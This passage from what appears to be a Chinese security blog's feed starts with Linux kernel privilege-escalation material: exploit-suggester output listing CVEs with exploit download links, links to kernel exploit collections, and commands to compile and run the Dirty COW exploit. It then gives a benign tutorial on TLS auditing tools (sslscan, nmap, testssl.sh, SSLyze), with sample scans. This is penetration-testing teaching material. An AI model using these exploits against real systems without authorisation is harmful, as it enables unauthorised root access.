https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user[+] [CVE-2015-9322] BadIRET   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/   Exposure: less probable   Tags: RHEL&lt;=7,fedora=20   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz[+] [CVE-2015-8660] overlayfs (ovl_setattr)   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/   Exposure: less probable   Tags: ubuntu=(14.04|15.10)&#123;kernel:4.2.0-(18|19|20|21|22)-generic&#125;   Download URL: https://www.exploit-db.com/download/39166[+] [CVE-2015-8660] overlayfs (ovl_setattr)   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/   Exposure: less probable   Download URL: https://www.exploit-db.com/download/39230[+] [CVE-2014-5207] fuse_suid   Details: https://www.exploit-db.com/exploits/34923/   Exposure: less probable   Download URL: https://www.exploit-db.com/download/34923[+] [CVE-2014-4014] inode_capable   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4   Exposure: less probable   Tags: ubuntu=12.04   Download URL: https://www.exploit-db.com/download/33824[+] [CVE-2014-0196] rawmodePTY   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html   Exposure: less probable   Download URL: https://www.exploit-db.com/download/33516[+] [CVE-2014-0038] timeoutpwn   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html   Exposure: less probable   Tags: ubuntu=13.10   Download URL: https://www.exploit-db.com/download/31346   Comments: CONFIG_X86_X32 needs to be enabled[+] [CVE-2014-0038] timeoutpwn 2   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html   Exposure: less probable   Tags: ubuntu=(13.04|13.10)&#123;kernel:3.(8|11).0-(12|15|19)-generic&#125;   Download URL: https://www.exploit-db.com/download/31347   Comments: CONFIG_X86_X32 needs to be enabled[+] [CVE-2016-0728] keyring   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/   Exposure: less probable   Download URL: https://www.exploit-db.com/download/40003   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</code></pre><h1 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2 漏洞利用"></a>2 漏洞利用</h1><ul><li><p>Windows平台提权漏洞集合：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></li><li><p>Linux平台提权漏洞集合：<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p></li></ul><p>2.1 脏牛利用</p><pre><code>$ gcc -pthread dirtyc0w.c -o dirtyc0w$ ./dirtyc0w foo m00000000000000000</code></pre><p><img src="/2020/08/26/pt-tiquan/1604484107935.png" alt="1604484107935"></p><p><a href="https://blog.csdn.net/prettyX/article/details/103923947">https://blog.csdn.net/prettyX/article/details/103923947</a></p><pre><code>gcc -pthread dirtyroot.c -o dirtyroot</code></pre>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/pt-tiquan/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>TLS安全检测小工具</title>
      <link>https://m01ly.github.io/2020/08/26/htps-tools/</link>
      <guid>https://m01ly.github.io/2020/08/26/htps-tools/</guid>
      <pubDate>Wed, 26 Aug 2020 08:34:27 GMT</pubDate>
      
      <description>&lt;p&gt;工作中需要检测服务所用的TLS套件版本等，可以用以下几种工具&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>工作中需要检测服务所用的TLS套件版本等，可以用以下几种工具</p><a id="more"></a><h2 id="1-工具汇总"><a href="#1-工具汇总" class="headerlink" title="1 工具汇总"></a>1 工具汇总</h2><p><strong>ssllabs</strong><br>强烈推荐这个网站,简洁直观,非常好<br><a href="https://www.ssllabs.com/">https://www.ssllabs.com/</a></p><p><strong>htbridge</strong><br>这个网站检测全面,SSL检测项目更新最快<br><a href="https://www.htbridge.com/ssl/">https://www.htbridge.com/ssl/</a></p><p><strong>myssl</strong><br>这个网站是中国特供,国内访问速度最快,并提供对各大国产浏览器的SSL检测<br><a href="https://myssl.com/">https://myssl.com</a></p><p><strong>testssl</strong> </p><p>非常全的工具 <a href="https://testssl.sh/">https://testssl.sh/</a> </p><h2 id="2-sslscan"><a href="#2-sslscan" class="headerlink" title="2  sslscan"></a>2  sslscan</h2><ul><li>是否支持TLS Fallback SCSV</li><li>是否支持压缩</li><li>是否有心脏滴血漏洞（heartbleed）</li><li>支持的密码套件（及服务器优选的preferred, 红色表示不安全算法，黄色代表中等强度的算法 ）</li><li>证书信息</li></ul><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h3><p>（1）下载源码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git clone https://github.com/rbsec/sslscan</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）进入目录</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token punctuation">[</span>root@localname~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd sslscan</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）编译安装</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token punctuation">[</span>root@localname sslscan<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># make static</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）查看是否编译成功</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token punctuation">[</span>root@localhost sslscan<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#./sslscan -version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/htps-tools/1597831322514.png" alt="1597831322514"></p><h3 id="2-2-使用"><a href="#2-2-使用" class="headerlink" title="2.2 使用"></a>2.2 使用</h3><p> [root@localhost sslscan]# ./sslscan –tlsall <a href="http://www.baidu.com:443/">www.baidu.com:443</a></p><p>​    OR</p><p>  [root@localhost sslscan]# ./sslscan –tlsall 192.168.5.200   —-假如192.168.5.200是你的服务器IP</p><p>​    PS：上述两个命令的前提是能够ping通。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname sslscan<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ./sslscan --tlsall www.baidu.com:443</span>Version: 2.0.0-staticOpenSSL 1.1.1h-dev  xx XXX xxxxConnected to 180.97.34.96Testing SSL server www.baidu.com on port 443 using SNI name www.baidu.com  SSL/TLS Protocols:TLSv1.0   enabledTLSv1.1   enabledTLSv1.2   enabledTLSv1.3   disabled  TLS Fallback SCSV:Server supports TLS Fallback SCSV  TLS renegotiation:Secure session renegotiation supported  TLS Compression:Compression disabled  Heartbleed:TLSv1.2 not vulnerable to heartbleedTLSv1.1 not vulnerable to heartbleedTLSv1.0 not vulnerable to heartbleed  Supported Server Cipher<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256Accepted  TLSv1.2  128 bits  ECDHE-RSA-RC4-SHA             Curve P-256 DHE 256Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256Accepted  TLSv1.2  128 bits  AES128-SHA                   Accepted  TLSv1.2  256 bits  AES256-SHA                   Accepted  TLSv1.2  128 bits  RC4-SHA                      Preferred TLSv1.1  128 bits  ECDHE-RSA-RC4-SHA             Curve P-256 DHE 256Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256Accepted  TLSv1.1  128 bits  AES128-SHA                   Accepted  TLSv1.1  256 bits  AES256-SHA                   Accepted  TLSv1.1  128 bits  RC4-SHA                      Preferred TLSv1.0  128 bits  ECDHE-RSA-RC4-SHA             Curve P-256 DHE 256Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256Accepted  TLSv1.0  128 bits  AES128-SHA                   Accepted  TLSv1.0  256 bits  AES256-SHA                   Accepted  TLSv1.0  128 bits  RC4-SHA                        Server Key Exchange Group<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:TLSv1.2  128 bits  secp256r1 <span class="token punctuation">(</span>NIST P-256<span class="token punctuation">)</span>  Server Signature Algorithm<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:TLSv1.2  Server accepts all signature algorithms.  SSL Certificate:Signature Algorithm: sha256WithRSAEncryptionRSA Key Strength:    2048Subject:  baidu.comAltnames: DNS:baidu.com, DNS:baifubao.com, DNS:www.baidu.cn, DNS:www.baidu.com.cn, DNS:mct.y.nuomi.com, DNS:apollo.auto, DNS:dwz.cn, DNS:*.baidu.com, DNS:*.baifubao.com, DNS:*.baidustatic.com, DNS:*.bdstatic.com, DNS:*.bdimg.com, DNS:*.hao123.com, DNS:*.nuomi.com, DNS:*.chuanke.com, DNS:*.trustgo.com, DNS:*.bce.baidu.com, DNS:*.eyun.baidu.com, DNS:*.map.baidu.com, DNS:*.mbd.baidu.com, DNS:*.fanyi.baidu.com, DNS:*.baidubce.com, DNS:*.mipcdn.com, DNS:*.news.baidu.com, DNS:*.baidupcs.com, DNS:*.aipage.com, DNS:*.aipage.cn, DNS:*.bcehost.com, DNS:*.safe.baidu.com, DNS:*.im.baidu.com, DNS:*.baiducontent.com, DNS:*.dlnel.com, DNS:*.dlnel.org, DNS:*.dueros.baidu.com, DNS:*.su.baidu.com, DNS:*.91.com, DNS:*.hao123.baidu.com, DNS:*.apollo.auto, DNS:*.xueshu.baidu.com, DNS:*.bj.baidubce.com, DNS:*.gz.baidubce.com, DNS:*.smartapps.cn, DNS:*.bdtjrcv.com, DNS:*.hao222.com, DNS:*.haokan.com, DNS:*.pae.baidu.com, DNS:*.vd.bdstatic.com, DNS:click.hm.baidu.com, DNS:log.hm.baidu.com, DNS:cm.pos.baidu.com, DNS:wn.pos.baidu.com, DNS:update.pan.baidu.comIssuer:   GlobalSign Organization Validation CA - SHA256 - G2Not valid before: Apr  2 07:04:58 2020 GMTNot valid after:  Jul 26 05:31:02 2021 GMT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-sslscan原理"><a href="#2-3-sslscan原理" class="headerlink" title="2.3 sslscan原理"></a>2.3 sslscan原理</h3><p> ① sslscan通过创建多个https的连接来试探服务器支持的加密方式；</p><p>   ② 当使用https连接到服务器的时候，会交换双方所支持的加密方式，之后选择双发都能支持的方式进行通信；</p><p>​      如果https服务器配置不当，就会存在MITM攻击，攻击者就可以通过客户端支持的弱加密算法来欺骗服务器；</p><p>​      假如使用的是SSLV2的56位DES，当攻击者拦截并使用了这种加密流量过后，可能在很短时间之内就能够破解加密密钥。</p><h3 id="2-4-功能"><a href="#2-4-功能" class="headerlink" title="2.4 功能"></a>2.4 功能</h3><p> ① sslscan能够检测heartbleed，这是一个openssl的漏洞；</p><p>​      heartbleed漏洞存在于OpenSSL TSL中，它由一个缓冲区导致，允许从内存中读取数据；实际上，Heartbleed 可以在任何未装补丁的支持 TLS 的 OpenSSL （1.0.1 到 1.0.1f 之间）服务器上利用；它从服务器内存中读取 64 KB 的纯文本数据，这能够重复执行，服务器上不会留下任何踪迹或日志。 这意味着攻击者可以从服务器读取纯文本信息，包括服务器的的私钥或者加密方式，会话 Cookie 或 HTTPS 请求会包含用户的密码或其它敏感信息。</p><h2 id="3-nmap"><a href="#3-nmap" class="headerlink" title="3 nmap"></a>3 nmap</h2><p> <a href="https://jumpnowtek.com/security/Using-nmap-to-check-certs-and-supported-algos.html">https://jumpnowtek.com/security/Using-nmap-to-check-certs-and-supported-algos.html</a> </p><p>查看证书</p><p>支持的密码套件</p><p>检测漏洞：心脏滴血 Poodle drown 等漏洞</p><h3 id="3-1-安装"><a href="#3-1-安装" class="headerlink" title="3.1 安装"></a>3.1 安装</h3><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> nmap    <span class="token comment" spellcheck="true">#输入y安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-使用"><a href="#3-2-使用" class="headerlink" title="3.2 使用"></a>3.2 使用</h3><p>（1）查看证书nmap –script ssl-cert -p 443 baidu.com</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># nmap --script ssl-cert -p 443 baidu.com</span>Starting Nmap 6.40 <span class="token punctuation">(</span> http://nmap.org <span class="token punctuation">)</span> at 2020-08-20 16:22 CSTNmap scan report <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>39.156.69.79<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0085s latency<span class="token punctuation">)</span>.Other addresses <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>not scanned<span class="token punctuation">)</span>: 220.181.38.148PORT    STATE SERVICE443/tcp <span class="token function">open</span>  https<span class="token operator">|</span> ssl-cert: Subject: commonName<span class="token operator">=</span>www.baidu.cn/organizationName<span class="token operator">=</span>BeiJing Baidu Netcom Science Technology Co., Ltd/stateOrProvinceName<span class="token operator">=</span>Beijing/countryName<span class="token operator">=</span>CN<span class="token operator">|</span> Issuer: commonName<span class="token operator">=</span>DigiCert SHA2 Secure Server CA/organizationName<span class="token operator">=</span>DigiCert Inc/countryName<span class="token operator">=</span>US<span class="token operator">|</span> Public Key type: rsa<span class="token operator">|</span> Public Key bits: 2048<span class="token operator">|</span> Not valid before: 2020-02-27T00:00:00+00:00<span class="token operator">|</span> Not valid after:  2021-02-26T12:00:00+00:00<span class="token operator">|</span> MD5:   d0cf b084 759f 231b 9b22 c197 6bd5 d271<span class="token operator">|</span>_SHA-1: e357 f6c5 b7d3 7464 8055 89c9 3797 c98d 9d38 2497Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 0.60 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）查看支持的TLS密码套件nmap –script ssl-enum-ciphers -p 443 baidu.com</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># nmap --script ssl-enum-ciphers -p 443 baidu.com</span>Starting Nmap 6.40 <span class="token punctuation">(</span> http://nmap.org <span class="token punctuation">)</span> at 2020-08-20 16:23 CSTNmap scan report <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>220.181.38.148<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0093s latency<span class="token punctuation">)</span>.Other addresses <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>not scanned<span class="token punctuation">)</span>: 39.156.69.79PORT    STATE SERVICE443/tcp <span class="token function">open</span>  https<span class="token operator">|</span> ssl-enum-ciphers: <span class="token operator">|</span>   SSLv3: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>   TLSv1.0: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>   TLSv1.1: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>   TLSv1.2: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA256 - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_GCM_SHA256 - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA256 - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_GCM_SHA384 - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>_  least strength: strongNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 2.23 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(3) More</p><p>您还可以使用Nmap脚本查找众所周知的ssl和tls漏洞</p><ul><li><a href="https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html">ssl-ccs-injection</a>：允许MITM攻击的连接设置错误（<a href="http://ccsinjection.lepidum.co.jp/">ccs-injection-vuln</a>，<a href="https://www.tripwire.com/state-of-security/vulnerability-management/openssl-ccs-injection-primer/">ccs-injection-primer</a>）</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-cert-intaddr.html">ssl-cert-intaddr</a>：内部IP地址泄漏</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-date.html">ssl-date</a>：远程服务器时间泄漏</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-dh-params.html">ssl-dh-params</a>：使用弱<a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie-Hellman</a>参数</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">ssl-heartbleed</a>：易受OpenSSL <a href="https://www.us-cert.gov/ncas/alerts/TA14-098A">Heartbleed </a><a href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">攻击</a></li><li><a href="https://nmap.org/nsedoc/scripts/ssl-known-key.html">ssl-known-key</a>：服务器正在使用已知的错误证书</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-poodle.html">ssl-poodle</a>：服务器允许易受攻击的SSLv3 CBC密码（<a href="https://www.us-cert.gov/ncas/alerts/TA14-290A">POODLE</a>）</li><li><a href="https://nmap.org/nsedoc/scripts/sslv2.html">sslv2</a>：服务器允许使用过时的SSLv2密码</li><li><a href="https://nmap.org/nsedoc/scripts/sslv2-drown.html">sslv2-drown</a>：服务器允许与<a href="https://www.us-cert.gov/ncas/current-activity/2016/03/01/SSLv2-DROWN-Attack">DROWN</a>攻击相关的SSLv2密码</li></ul><h2 id="4-testssl"><a href="#4-testssl" class="headerlink" title="4 testssl"></a>4 testssl</h2><p>testssl.sh是我们首选的测试工具，它涵盖了TLS和SSL评估所需的所有测试所需工具，并定期更新。</p><h3 id="4-1-安装"><a href="#4-1-安装" class="headerlink" title="4.1 安装"></a>4.1 安装</h3><pre><code>git clone https://github.com/drwetter/testssl.sh.git</code></pre><h3 id="4-2-testssl-sh示例"><a href="#4-2-testssl-sh示例" class="headerlink" title="4.2 testssl.sh示例"></a>4.2 testssl.sh示例</h3><p>有许多可以用于testssl.sh的测试选项，您应该使用的选项将在很大程度上取决于您的测试要求。以下是部分有关testssl.sh命令行选项的示例。运行./testssl.sh可以看到所有选项。详情见 <a href="https://testssl.sh/">https://testssl.sh/</a> </p><pre><code>[root@m01ly ~]#  cd testssl.sh[root@m01ly testssl.sh]# ./testssl.sh -e www.baidu.com</code></pre><p>它是在CentOS 7上运行的, 如果你遇到相同的问题, 则可以通过以下方法解决它。Fatal error: Neither “dig”, “host”, “drill” or “nslookup” is present<img src="/2020/08/26/htps-tools/1614074377668.png" alt="1614074377668"></p><p><strong>solution：</strong>当程序找不到任何实用程序来解析IP或域时, 就会发生这种情况。你可以安装bind-utils来修复错误。</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> bind-utils -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-0-测试单个主机上的TLS版本并输出到控制台"><a href="#4-2-0-测试单个主机上的TLS版本并输出到控制台" class="headerlink" title="4.2.0 测试单个主机上的TLS版本并输出到控制台"></a>4.2.0 测试单个主机上的TLS版本并输出到控制台</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -p TARGET-HOST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-2-测试单个主机上的所有内容并输出到HTML"><a href="#4-2-2-测试单个主机上的所有内容并输出到HTML" class="headerlink" title="4.2.2 测试单个主机上的所有内容并输出到HTML"></a>4.2.2 测试单个主机上的所有内容并输出到HTML</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh --warnings<span class="token operator">=</span>batch --html 172.24.110.10:6443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-1-测试单个主机上的所有内容并输出到控制台"><a href="#4-2-1-测试单个主机上的所有内容并输出到控制台" class="headerlink" title="4.2.1 测试单个主机上的所有内容并输出到控制台"></a>4.2.1 测试单个主机上的所有内容并输出到控制台</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-2-测试单个主机上的所有内容并输出到HTML-1"><a href="#4-2-2-测试单个主机上的所有内容并输出到HTML-1" class="headerlink" title="4.2.2 测试单个主机上的所有内容并输出到HTML"></a>4.2.2 测试单个主机上的所有内容并输出到HTML</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST <span class="token operator">|</span> aha<span class="token operator">></span> OUTPUT-FILE.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-3测试子网上的所有主机并输出到HTML"><a href="#4-2-3测试子网上的所有主机并输出到HTML" class="headerlink" title="4.2.3测试子网上的所有主机并输出到HTML"></a>4.2.3测试子网上的所有主机并输出到HTML</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U 192.168.1.0/24 <span class="token operator">|</span> aha<span class="token operator">></span> OUTPUT-FILE.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与上述相同，但只列举每个服务器支持的密码类型：</p><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -E 192.168.1.0/24 <span class="token operator">|</span> aha<span class="token operator">></span> OUTPUT-FILE.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有很多功能。</p><h2 id="5-SSLyze"><a href="#5-SSLyze" class="headerlink" title="5 SSLyze"></a>5 SSLyze</h2><h3 id="5-1-安装"><a href="#5-1-安装" class="headerlink" title="5.1 安装"></a>5.1 安装</h3><pre class="line-numbers language-bash"><code class="language-bash">$ pip <span class="token function">install</span> --upgrade setuptools$ pip <span class="token function">install</span> --upgrade sslyze<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-2-使用"><a href="#5-2-使用" class="headerlink" title="5.2 使用"></a>5.2 使用</h3><pre class="line-numbers language-bash"><code class="language-bash">$ python -m sslyze --regular www.yahoo.com:443 www.google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"> SCAN RESULTS FOR WWW.YAHOO.COM:443 - 202.165.107.50 --------------------------------------------------- * Deflate Compression:                                          OK - Compression disabled * SSLV3 Cipher Suites:      Server rejected all cipher suites. * TLSV1 Cipher Suites:       Forward Secrecy                    OK - Supported       RC4                                OK - Not Supported     Preferred:        TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                      Accepted:        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA              ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                  * Session Renegotiation:       Client-initiated Renegotiation:    OK - Rejected       Secure Renegotiation:              OK - Supported * OpenSSL CCS Injection:                                          OK - Not vulnerable to OpenSSL CCS injection * SSLV2 Cipher Suites:      Server rejected all cipher suites. * Certificate Information:     Content       SHA1 Fingerprint:                  3672d010de4097e1d06898229df2821a1b49a2a1       Common Name:                       *.www.yahoo.com       Issuer:                            DigiCert SHA2 High Assurance Server CA       Serial Number:                     9093429354078714021559623999443547105       Not Before:                        2020-05-11 00:00:00       Not After:                         2020-11-07 12:00:00       Signature Algorithm:               sha256       Public Key Algorithm:              EllipticCurve       Key Size:                          256       Curve:                             secp256r1       DNS Subject Alternative Names:     <span class="token punctuation">[</span>u<span class="token string">'yahoo.com'</span>, u<span class="token string">'*.yahoo.com'</span>, u<span class="token string">'*.www.yahoo.com'</span>, u<span class="token string">'mbp.yimg.com'</span>, u<span class="token string">'*.media.yahoo.com'</span>, u<span class="token string">'brb.yahoo.net'</span>, u<span class="token string">'*.att.yahoo.com'</span>, u<span class="token string">'s.yimg.com'</span>, u<span class="token string">'*.amp.yimg.com'</span>, u<span class="token string">'fr-ca.rogers.yahoo.com'</span>, 